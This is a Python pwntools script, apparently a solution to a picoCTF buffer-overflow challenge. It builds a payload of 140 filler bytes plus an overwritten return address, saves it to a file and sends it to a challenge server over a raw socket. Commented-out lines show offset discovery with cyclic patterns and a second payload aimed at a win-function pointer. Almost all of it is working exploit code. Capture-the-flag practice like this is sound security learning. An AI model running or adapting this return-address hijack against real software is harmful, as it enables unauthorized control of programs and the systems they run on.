from pwn import *
import os

offset = 140
lolxd = p32(0x00401530)

payload = b'A'*offset + lolxd
f = open('cancer', 'wb')
f.write(payload)

def netcat(host, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    print(s.recv(100))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096)
        if not data:
            break
        print(repr(data))
    s.close()

netcat('saturn.picoctf.net', 61634, payload)


# offset = cyclic_find(0x6261616b)
# print(offset)

# exploitstr = cyclic(200)
# print(exploitstr)
# os.system(f"python -c print {exploitstr} | vuln.exe")

# c = remote("saturn.picoctf.net", 49918)
# c = process('./vuln.exe')
# c.send(exploitstr)
# print(c.recvall())

'''
WIN_ptr = 0x00401190

# cyclic_find(0x6261616e)
exploitstr = "A"*152 + p32(WIN_ptr)

c = connect("127.0.0.1",31337)
c.send(exploitstr)
'''
